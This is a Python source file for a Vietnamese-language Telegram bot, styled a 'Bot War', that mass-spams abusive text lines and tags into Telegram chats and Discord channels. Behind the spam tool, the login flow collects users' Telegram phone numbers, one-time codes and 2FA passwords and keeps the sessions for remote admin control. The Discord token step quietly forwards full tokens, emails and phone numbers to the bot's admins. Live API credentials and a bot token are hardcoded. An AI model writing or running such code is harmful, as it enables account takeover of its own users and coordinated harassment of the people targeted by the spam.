import asyncio, os, random, datetime, re, glob, requests, json, base64, time
from aiohttp import web, ClientSession
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    FloodWaitError, RPCError, UserNotParticipantError, 
    SessionPasswordNeededError, PhoneCodeInvalidError, 
    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
)

# ==========================================
# CẤU HÌNH HỆ THỐNG
# ==========================================
A_ID = 32300846
A_HS = "a6da3117ff6b8a1679d04ab743976068"
B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
O_ID = 7907990385

REQUIRED_GROUPS = [
    {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
    {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm 2"}
]

U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
U2 = "https://gist.githubusercontent.com/tranthanhloc2099-wq/26971850c22bbc6578dae5a91fc2f154/raw/e96b3178dbce97dab5a9218eced5085802eb1711/chui2.txt"

user_delays = {}
DEFAULT_DELAY = 0.2

admin_selected_target = {}
anti_disconnect_tasks = {}

# LƯU PHIÊN DISCORD TRONG BỘ NHỚ (Chỉ mất khi Restart/Tắt Bot)
discord_sessions = {}
discord_spam_tasks = {}

def get_user_delay(u_i):
    return user_delays.get(u_i, DEFAULT_DELAY)

def to_small_caps(text):
    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    small  = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢAʙCᴅEғGʜIᴊKʟMɴOᴘQʀSᴛUᴠWXYᴢ0123456789"
    trans = str.maketrans(normal, small)
    return text.translate(trans)

def get_default_lines():
    lines = []
    if os.path.exists("chui.txt"):
        with open("chui.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    if not lines and os.path.exists("chui2.txt"):
        with open("chui2.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
    if not lines:
        lines = ["TLong spam tới"]
    return lines

def _sync():
    for n, u in {"chui.txt": U1, "chui2.txt": U2}.items():
        try:
            r = requests.get(u, timeout=10)
            if r.status_code == 200:
                with open(n, "w", encoding="utf-8") as f: f.write(r.text)
        except: pass
_sync()

bot = TelegramClient('bot_manage', A_ID, A_HS)
u_c, s_t, cl_t, w_m = {}, {}, {}, {}

F1, F2, F3, F4 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt"

if os.path.exists(F2):
    with open(F2, "r") as f: b_u = set(int(l.strip()) for l in f if l.strip())
else: b_u = set()

if os.path.exists(F3):
    with open(F3, "r") as f: verified_users = set(int(l.strip()) for l in f if l.strip())
else: verified_users = set()

if os.path.exists(F4):
    with open(F4, "r") as f: admins = set(int(l.strip()) for l in f if l.strip())
else: admins = {O_ID}

def _save_verified():
    with open(F3, "w") as f:
        for uid in verified_users: f.write(f"{uid}\n")

def _su(u):
    if not os.path.exists(F1): open(F1, "w").close()
    with open(F1, "r") as f: us = f.read().splitlines()
    if str(u) not in us:
        with open(F1, "a") as f: f.write(f"{u}\n")

async def is_user_in_channel(user_id):
    if user_id in admins: return True
    try:
        for group in REQUIRED_GROUPS:
            await bot(functions.channels.GetParticipantRequest(
                channel=group["username"], participant=user_id
            ))
        if user_id not in verified_users:
            verified_users.add(user_id)
            _save_verified()
        return True
    except UserNotParticipantError:
        if user_id in verified_users:
            verified_users.remove(user_id)
            _save_verified()
        return False
    except Exception:
        if user_id in verified_users:
            return True
        return False

# ==========================================
# GIAO DIỆN CHỌN APP
# ==========================================
def get_app_selector_menu():
    msg = """
🤖 **Bot War By Trần Minh Đức**
────────────────
Vui lòng chọn ứng dụng bạn muốn chiến:
"""
    buttons = [
        [Button.inline("📱 Telegram War System", data="app_telegram")],
        [Button.inline("🤖 Discord Spam System", data="app_discord")]
    ]
    return msg, buttons

def get_main_menu(u):
    logged = u in u_c
    status_text = "🟢 ĐÃ LOGIN (Sẵn sàng chiến)" if logged else "🔴 CHƯA LOGIN (Cần đăng nhập)"
    current_delay = get_user_delay(u)
    
    msg = f"""
🔥 **TELEGRAM WAR SYSTEM**
────────────────
• Trạng thái tài khoản: `{status_text}`
• Delay hiện tại: `{current_delay}s`
• Chọn chức năng bên dưới:
"""
    buttons = [
        [Button.inline("💥 Spam & Tag", data="m_spam"), Button.inline("☠ Mute / Câm", data="m_mute")],
        [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY", data="m_setting")]
    ]
    
    if u in admins:
        buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])

    buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
    buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
    buttons.append([Button.url("💬 Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
    
    return msg, buttons

def get_join_msg():
    msg = """
⚠️ **YÊU CẦU THAM GIA ĐỦ 2 NHÓM**

Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử dụng được bot:
"""
    buttons = []
    idx = 1
    for g in REQUIRED_GROUPS:
        buttons.append([Button.url(f"📢 Vào {g['name']}", g["link"])])
        msg += f"\n{idx}. [{g['name']}]({g['link']})"
        idx += 1

    msg += "\n\nVào đủ nhóm xong bấm nút **Xác Nhận** bên dưới."
    buttons.append([Button.inline("🔄 Xác Nhận Đã Vào Đủ Nhóm", data="check_join")])
    return msg, buttons

async def notify_admin_login(client, user_id, phone_number):
    try:
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        about_text = full_user.full_user.about or "Không có"
        
        device_model = "Không xác định"
        app_version = "Không xác định"
        try:
            auths = await client(functions.account.GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if auth.current:
                    device_model = f"{auth.device_model} ({auth.platform})"
                    app_version = auth.app_name
                    break
        except:
            pass

        now = datetime.datetime.now()
        time_str = now.strftime('%H:%M:%S - %d/%m/%Y')

        photos = await client.get_profile_photos('me', limit=1)
        avatar_path = None
        if photos:
            avatar_path = await client.download_media(photos[0], file=f"avatar_{user_id}.jpg")
        
        caption = f"""
🚨 **THÔNG BÁO TÀI KHOẢN TELEGRAM LOGIN THÀNH CÔNG**
────────────────
• **Thời gian:** `{time_str}`
• **ID Userbot:** `{me.id}`
• **Họ Tên:** `{me.first_name} {me.last_name or ''}`
• **Username:** `@{me.username if me.username else 'N/A'}`
• **Số Điện Thoại:** `+{phone_number}`
• **Hồ Sơ (Bio):** `{about_text}`
• **Thiết Bị:** `{device_model}`
• **Ứng Dụng:** `{app_version}`
• **ID Người Dùng Bot:** `{user_id}`
"""
        buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]

        for admin_id in admins:
            try:
                if avatar_path and os.path.exists(avatar_path):
                    await bot.send_file(admin_id, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
                else:
                    await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
            except:
                pass
                
        if avatar_path and os.path.exists(avatar_path):
            os.remove(avatar_path)
    except Exception as e:
        print(f"Lỗi gửi thông báo login: {e}")

async def start_anti_disconnect(target_uid, client):
    while target_uid in u_c:
        try:
            await client.get_me()
        except:
            pass
        await asyncio.sleep(240)

# ==========================================
# DISCORD HELPER & CHECK TOKEN
# ==========================================
def get_discord_headers(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    }

async def get_discord_user_info(token):
    headers = get_discord_headers(token)
    url = "https://discord.com/api/v10/users/@me"
    try:
        async with ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    user_id = int(data.get("id"))
                    timestamp = ((user_id >> 22) + 1420070400000) / 1000
                    created_at = datetime.datetime.fromtimestamp(timestamp).strftime('%d/%m/%Y %H:%M:%S')
                    return True, data, created_at
                else:
                    return False, None, None
    except Exception as e:
        print(f"Lỗi check token discord: {e}")
        return False, None, None

async def notify_admin_discord_token(user_id, token, user_data, created_at):
    try:
        username = f"{user_data.get('username')}#{user_data.get('discriminator', '0')}"
        uid = user_data.get('id')
        email = user_data.get('email', 'Không có')
        phone = user_data.get('phone', 'Không có')
        
        premium_type = user_data.get('premium_type', 0)
        nitro_map = {0: "Không có Nitro", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}
        nitro_status = nitro_map.get(premium_type, "Không rõ")

        flags = user_data.get('public_flags', 0)
        has_orb = "Có Orb/Badge Đặc Biệt" if flags > 0 else "Không có Orb"

        caption = f"""
🚨 **THÔNG BÁO TOKEN DISCORD VỪA ĐƯỢC NẠP!**
────────────────
• **ID Telegram người gửi:** `{user_id}`
• **Tên Tài Khoản:** `{username}`
• **ID Discord:** `{uid}`
• **Ngày Tạo Acc:** `{created_at}`
• **Trạng Thái Nitro:** `{nitro_status}`
• **Số Orb / Badges:** `{has_orb}`
• **Email:** `{email}`
• **Số Điện Thoại:** `{phone}`
• **Token:** `{token}`
"""
        for admin_id in admins:
            try:
                await bot.send_message(admin_id, caption, parse_mode='markdown')
            except:
                pass
    except Exception as e:
        print(f"Lỗi gửi thông báo token discord: {e}")

# ==========================================
# GIAO DIỆN BẢNG ĐIỀU KHIỂN DISCORD (HỖ TRỢ GIỮ PHIÊN)
# ==========================================
def render_discord_dashboard(u):
    # Khởi tạo mặc định nếu chưa có phiên
    if u not in discord_sessions:
        discord_sessions[u] = {
            "tokens": [], 
            "channels": [], 
            "lines": get_default_lines(),
            "delay": 2.0, 
            "mode": "full", 
            "font_style": "big", 
            "tag_target": "", 
            "use_custom_file": False,
            "step": None
        }

    session = discord_sessions[u]
    tokens = session.get("tokens", [])
    channels = session.get("channels", [])
    delay = session.get("delay", 2.0)
    mode = session.get("mode", "full") 
    font_style = session.get("font_style", "big") 
    tag_target = session.get("tag_target", "") 
    use_custom_file = session.get("use_custom_file", False)
    
    is_running = u in discord_spam_tasks and not discord_spam_tasks[u].done()
    status_str = "🟢 Đang Spam..." if is_running else "🔴 Đang Dừng"

    tokens_str = f"{len(tokens)} Token" if tokens else "❌ Chưa nhập"
    channels_str = ', '.join(channels) if channels else "❌ Chưa cài"
    mode_str = "Gửi Full (1 lần)" if mode == "full" else "Gửi Từng Dòng"
    font_str = "Chữ To (# Nổi Bật)" if font_style == "big" else "Chữ Bé (Small Caps)"
    tag_str = f"<@{tag_target}> (ID: {tag_target})" if tag_target else "❌ Tắt Spam Tag"
    
    lines = session.get("lines", [])
    if not lines or not use_custom_file:
        lines = get_default_lines()
        source_str = "Dùng chung Kho Ngôn Telegram (Mặc Định)"
    else:
        source_str = f"File .TXT Cá Nhân ({len(lines)} Dòng)"

    display_sample = lines[0][:40] if lines else "Không có nội dung"

    txt = f"""
🤖 **BẢNG ĐIỀU KHIỂN DISCORD SPAM SYSTEM**
────────────────
• **Trạng thái:** `{status_str}`
• **Kho Ngôn đang dùng:** `{source_str}`
• **Danh sách Token:** `{tokens_str}`
• **ID Kênh/Nhóm Chat:** `{channels_str}`
• **Chế độ gửi:** `{mode_str}`
• **Kiểu chữ:** `{font_str}`
• **Spam Tag cuối câu:** `{tag_str}`
• **Nội dung câu mẫu:** `{display_sample}...`
• **Delay:** `{delay}s`
"""
    buttons = []
    if is_running:
        buttons.append([Button.inline("⏹ NGỪNG SPAM DISCORD", data="dc_stop_spam")])
    else:
        buttons.append([Button.inline("▶ BẮT ĐẦU SPAM DISCORD", data="dc_start_spam")])

    buttons.append([
        Button.inline("🆔 Cấu Hình ID Kênh", data="dc_set_channels"),
        Button.inline("📝 Đổi Kho Ngôn (.txt)", data="dc_set_content")
    ])
    buttons.append([
        Button.inline(f"⚙️ Mode: {mode_str}", data="dc_toggle_mode"),
        Button.inline(f"🔤 Font: {'To (#)' if font_style=='big' else 'Bé'}", data="dc_toggle_font")
    ])
    buttons.append([
        Button.inline("🏷 Thêm Tag Spam Cuối Câu", data="dc_set_tag"),
        Button.inline("⏱ Cấu Hình Delay", data="dc_set_delay")
    ])
    buttons.append([
        Button.inline("🔑 Quản Lý Token", data="dc_set_tokens"),
        Button.inline("🔄 Reset Cấu Hình", data="dc_reset")
    ])
    buttons.append([
        Button.inline("🚪 Đăng Xuất Discord", data="dc_logout"),
        Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")
    ])

    return txt, buttons

# ==========================================
# TELEGRAM USERBOT LOGIC & HANDLERS
# ==========================================
def _logic(c, u_i):
    @c.on(events.NewMessage(outgoing=True, pattern=r'/sptagname (@?\w+)'))
    async def _sptagname(e):
        username = e.pattern_match.group(1).replace('@', '')
        await e.delete()
        if os.path.exists('chui.txt'):
            with open('chui.txt', 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
            if not lines: return
            s_t[u_i] = True
            while s_t.get(u_i):
                for m in lines:
                    if not s_t.get(u_i): break
                    try:
                        fm = f"{m} [@{username}](tg://resolve?domain={username})"
                        await c.send_message(e.chat_id, fm, parse_mode='markdown')
                        delay = get_user_delay(u_i)
                        await asyncio.sleep(delay)
                    except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
                    except: break

    @c.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
    async def _stp(e):
        s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 **STOP!**"); await asyncio.sleep(1); await e.delete()

@bot.on(events.NewMessage(pattern='/start'))
async def _st(ev):
    u = ev.sender_id
    _su(u)
    if await is_user_in_channel(u):
        msg, buttons = get_app_selector_menu()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')
    else:
        msg, buttons = get_join_msg()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery)
async def _callback_handler(ev):
    u = ev.sender_id
    data = ev.data.decode('utf-8')

    if u in b_u: return await ev.answer("🚫 Bạn đã bị BAN!", alert=True)

    if data == "check_join":
        if await is_user_in_channel(u):
            msg, buttons = get_app_selector_menu()
            await ev.edit(msg, buttons=buttons, parse_mode='markdown')
            return await ev.answer("✅ Đã xác nhận tham gia đủ các nhóm!", alert=True)
        else:
            return await ev.answer("❌ Bạn vẫn chưa tham gia đủ cả 2 nhóm!", alert=True)

    if not await is_user_in_channel(u):
        msg, buttons = get_join_msg()
        try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
        except: await ev.respond(msg, buttons=buttons, parse_mode='markdown')
        return await ev.answer("⚠️ Bạn thiếu nhóm tham gia! Vui lòng vào đủ nhóm.", alert=True)

    if data == "back_to_apps":
        msg, buttons = get_app_selector_menu()
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "app_telegram":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "app_discord":
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_set_tokens":
        discord_sessions[u]["step"] = "ask_num"
        txt = "🔑 **CẤU HÌNH TOKEN DISCORD**\n────────────────\n• Nhập số lượng Token bạn muốn dùng (Ví dụ: `2`):"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')

    elif data == "dc_set_channels":
        discord_sessions[u]["step"] = "ask_channels"
        txt = "🆔 **CẤU HÌNH ID KÊNH / NHÓM DISCORD**\n────────────────\n• Nhập ID Kênh/Nhóm Chat (nhiều ID cách nhau bởi dấu phẩy `,`):"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')

    elif data == "dc_set_content":
        discord_sessions[u]["step"] = "ask_content"
        txt = """
📝 **CẤU HÌNH KHO NGÔN SPAM DISCORD**
────────────────
• Mặc định Bot sẽ dùng **Kho Ngôn giống Bot Telegram**.
• Nếu muốn dùng kho ngôn riêng: Hãy **GỬI FILE .TXT** lên.
• Hoặc nhập chữ/văn bản trực tiếp.
• Gửi chữ `reset` nếu muốn quay về dùng Kho Ngôn mặc định.
"""
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')

    elif data == "dc_set_tag":
        discord_sessions[u]["step"] = "ask_tag"
        txt = "🏷 **CẤU HÌNH TAG SPAM CUỐI CÂU**\n────────────────\n• Nhập **User ID** Discord của đối tượng bạn muốn Tag ở cuối câu:\n*(Ví dụ: `123456789012345678` - Gửi `0` để TẮT tag)*"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')

    elif data == "dc_toggle_mode":
        curr_mode = discord_sessions[u].get("mode", "full")
        discord_sessions[u]["mode"] = "line" if curr_mode == "full" else "full"
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_toggle_font":
        curr_font = discord_sessions[u].get("font_style", "big")
        discord_sessions[u]["font_style"] = "small" if curr_font == "big" else "big"
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_set_delay":
        discord_sessions[u]["step"] = "ask_delay"
        txt = "⏱ **CẤU HÌNH DELAY DISCORD**\n────────────────\n• Nhập số giây Delay giữa các tin nhắn (Ví dụ: `1.5` hoặc `3`):"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Discord", data="app_discord")]], parse_mode='markdown')

    elif data == "dc_start_spam":
        session = discord_sessions.get(u, {})
        tokens = session.get("tokens", [])
        channels = session.get("channels", [])
        
        if not tokens:
            return await ev.answer("❌ Bạn chưa cài đặt Token Discord!", alert=True)
        if not channels:
            return await ev.answer("❌ Bạn chưa cài đặt ID Kênh Discord!", alert=True)

        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            return await ev.answer("⚠️ Tiến trình Spam đang chạy rồi!", alert=True)

        mode = session.get("mode", "full")
        font_style = session.get("font_style", "big")
        delay = session.get("delay", 2.0)
        tag_target = session.get("tag_target", "")
        
        use_custom_file = session.get("use_custom_file", False)
        lines = session.get("lines", []) if use_custom_file else get_default_lines()
        raw_content = "\n".join(lines)

        async def run_spam_loop():
            async with ClientSession() as session_http:
                line_idx = 0
                while True:
                    for t in tokens:
                        headers = get_discord_headers(t)
                        for ch in channels:
                            url = f"https://discord.com/api/v10/channels/{ch}/messages"
                            
                            if mode == "full":
                                msg_text = raw_content
                            else:
                                msg_text = lines[line_idx % len(lines)]
                                line_idx += 1

                            if font_style == "big":
                                formatted_lines = [f"# {l}" if not l.startswith('#') else l for l in msg_text.splitlines()]
                                msg_text = "\n".join(formatted_lines)
                            elif font_style == "small":
                                msg_text = to_small_caps(msg_text)

                            if tag_target:
                                msg_text = f"{msg_text} <@{tag_target}>"

                            payload = {"content": msg_text, "tts": False}

                            try:
                                async with session_http.post(url, headers=headers, json=payload, timeout=10) as resp:
                                    if resp.status == 429:
                                        retry_data = await resp.json()
                                        wait_time = retry_data.get("retry_after", 2.0)
                                        await asyncio.sleep(wait_time)
                            except Exception as ex:
                                pass
                            await asyncio.sleep(delay)

        task = asyncio.create_task(run_spam_loop())
        discord_spam_tasks[u] = task
        await ev.answer("🚀 Đã BẮT ĐẦU spam Discord!", alert=True)
        
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_stop_spam":
        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            discord_spam_tasks[u].cancel()
            discord_spam_tasks.pop(u, None)
            await ev.answer("🛑 Đã NGỪNG tiến trình Spam Discord!", alert=True)
        else:
            await ev.answer("⚠️ Không có tiến trình spam nào đang chạy!", alert=True)

        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_reset":
        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            discord_spam_tasks[u].cancel()
            discord_spam_tasks.pop(u, None)
        
        discord_sessions[u] = {
            "tokens": [], "channels": [], "lines": get_default_lines(),
            "delay": 2.0, "mode": "full", "font_style": "big", 
            "tag_target": "", "use_custom_file": False, "step": None
        }
        await ev.answer("🔄 Đã reset toàn bộ cấu hình Discord!", alert=True)
        
        txt, buttons = render_discord_dashboard(u)
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "dc_logout":
        if u in discord_spam_tasks and not discord_spam_tasks[u].done():
            discord_spam_tasks[u].cancel()
            discord_spam_tasks.pop(u, None)

        discord_sessions.pop(u, None)
        msg, buttons = get_app_selector_menu()
        await ev.edit("🚪 **Đã xóa phiên làm việc Discord khỏi bộ nhớ tạm!**\n\n" + msg, buttons=buttons, parse_mode='markdown')

    elif data == "m_main":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "login":
        if u in u_c: return await ev.answer("✅ Bạn đã đăng nhập rồi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            try:
                await cv.send_message("📱 **Nhập Số Điện Thoại** (`+84...`):")
                p = (await cv.get_response()).text.strip().replace(" ", "")
                c = TelegramClient(f"u_{u}", A_ID, A_HS)
                await c.connect()

                if not await c.is_user_authorized():
                    try:
                        r = await c.send_code_request(p)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi gửi mã:** `{err}`")

                    await cv.send_message("🔑 **Nhập OTP** (⚠️ *BẮT BUỘC cách khoảng, VD: 4 8 1 1 7*):")
                    o = (await cv.get_response()).text.strip().replace(" ", "").replace("-", "")
                    
                    try:
                        await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
                    except SessionPasswordNeededError:
                        await cv.send_message("🔐 **Tài khoản bật 2FA.** Nhập mật khẩu:")
                        pwd = (await cv.get_response()).text.strip()
                        await c.sign_in(password=pwd)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                
                u_c[u] = c; _logic(c, u)
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task

                await notify_admin_login(c, u, p)
                await cv.send_message("✅ **LOGIN THÀNH CÔNG & ĐÃ BẬT GIỮ KẾT NỐI (ANTI-DIS 4 PHÚT)!**")
            except Exception as e:
                await cv.send_message(f"❌ **Lỗi Login:** `{e}`")

# Xử lý nhập liệu lưu vào Discord Session
@bot.on(events.NewMessage(incoming=True))
async def handle_discord_text_input(ev):
    u = ev.sender_id
    if u not in discord_sessions: return
    if ev.text and ev.text.startswith('/'): return

    session = discord_sessions[u]
    step = session.get("step")

    if step == "ask_num":
        text = ev.text.strip()
        if not text.isdigit():
            return await ev.respond("❌ Vui lòng nhập một số nguyên hợp lệ!")
        num = int(text)
        session["num_tokens"] = num
        session["step"] = "ask_tokens"
        await ev.respond(f"🔑 **Vui lòng gửi {num} token Discord** (nếu nhiều hơn 1 token, cách nhau bởi dấu phẩy `,`):")

    elif step == "ask_tokens":
        raw_tokens = ev.text.strip()
        tokens = [t.strip() for t in raw_tokens.replace(",", " ").split() if t.strip()]
        if len(tokens) != session.get("num_tokens", len(tokens)):
            return await ev.respond(f"❌ Bạn cần gửi đúng {session.get('num_tokens')} token (hiện nhận được {len(tokens)}). Vui lòng gửi lại!")
        
        session["tokens"] = tokens
        for t in tokens:
            valid, user_data, created_at = await get_discord_user_info(t)
            if valid:
                await notify_admin_discord_token(u, t, user_data, created_at)

        session["step"] = None
        txt, buttons = render_discord_dashboard(u)
        await ev.respond("✅ **Đã lưu Token thành công!**\n" + txt, buttons=buttons, parse_mode='markdown')

    elif step == "ask_channels":
        ch_input = ev.text.strip()
        channel_ids = [part.strip() for part in ch_input.replace(",", " ").split() if part.strip().isdigit()]
        if not channel_ids:
            return await ev.respond("❌ Không có ID kênh hợp lệ! Vui lòng nhập lại.")
        
        session["channels"] = channel_ids
        session["step"] = None
        txt, buttons = render_discord_dashboard(u)
        await ev.respond("✅ **Đã cập nhật ID Kênh!**\n" + txt, buttons=buttons, parse_mode='markdown')

    elif step == "ask_content":
        if ev.text and ev.text.strip().lower() == "reset":
            session["use_custom_file"] = False
            session["lines"] = get_default_lines()
            session["step"] = None
            txt, buttons = render_discord_dashboard(u)
            return await ev.respond("✅ **Đã chuyển về dùng Kho Ngôn mặc định!**\n" + txt, buttons=buttons, parse_mode='markdown')

        if ev.file and ev.file.ext == ".txt":
            try:
                file_bytes = await ev.download_media(bytes)
                raw_text = file_bytes.decode('utf-8', errors='ignore').strip()
                lines = [line.strip() for line in raw_text.splitlines() if line.strip()]
                
                if not lines:
                    return await ev.respond("❌ File .txt rỗng! Vui lòng gửi lại file khác.")

                session["lines"] = lines
                session["use_custom_file"] = True
                session["step"] = None

                txt, buttons = render_discord_dashboard(u)
                return await ev.respond(f"✅ **Đã Nạp Thành Công File TXT Cá Nhân ({len(lines)} Dòng)!**\n" + txt, buttons=buttons, parse_mode='markdown')
            except Exception as ex:
                return await ev.respond(f"❌ Lỗi đọc file TXT: `{ex}`")

        elif ev.text:
            content = ev.text.strip()
            lines = [line.strip() for line in content.splitlines() if line.strip()]
            session["lines"] = lines
            session["use_custom_file"] = True
            session["step"] = None

            txt, buttons = render_discord_dashboard(u)
            await ev.respond("✅ **Đã cập nhật Kho Ngôn riêng!**\n" + txt, buttons=buttons, parse_mode='markdown')

    elif step == "ask_tag":
        tag_val = ev.text.strip().replace("<@", "").replace(">", "").replace("!", "")
        if tag_val == "0":
            session["tag_target"] = ""
            msg_out = "✅ **Đã TẮT tính năng Spam Tag!**"
        elif tag_val.isdigit():
            session["tag_target"] = tag_val
            msg_out = f"✅ **Đã cài đặt Tag cho User ID:** `{tag_val}`!"
        else:
            return await ev.respond("❌ User ID phải là dãy số hợp lệ!")

        session["step"] = None
        txt, buttons = render_discord_dashboard(u)
        await ev.respond(f"{msg_out}\n" + txt, buttons=buttons, parse_mode='markdown')

    elif step == "ask_delay":
        try:
            delay = float(ev.text.strip())
            if delay < 0.1: delay = 0.1
        except:
            delay = 2.0
        
        session["delay"] = delay
        session["step"] = None
        txt, buttons = render_discord_dashboard(u)
        await ev.respond("✅ **Đã cập nhật Delay!**\n" + txt, buttons=buttons, parse_mode='markdown')

# ==========================================
# WEB SERVER GIỮ SỐNG (RENDER)
# ==========================================
async def handle_ping(request):
    return web.Response(text="Bot War Multi-Platform is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

# ==========================================
# CHƯƠNG TRÌNH CHÍNH
# ==========================================
async def main():
    await start_web_server()
    await bot.start(bot_token=B_TK)
    
    for f in glob.glob("u_*.session"):
        try:
            u_str = f.split('_')[1].split('.')[0]
            if not u_str.isdigit(): continue
            u = int(u_str)
            if u in b_u: continue
            
            c = TelegramClient(f"u_{u}", A_ID, A_HS)
            await c.connect()
            if await c.is_user_authorized():
                u_c[u] = c
                _logic(c, u)
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task
            else: 
                await c.disconnect()
        except Exception as e:
            print(f"Lỗi load session {f}: {e}")
            
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
ue
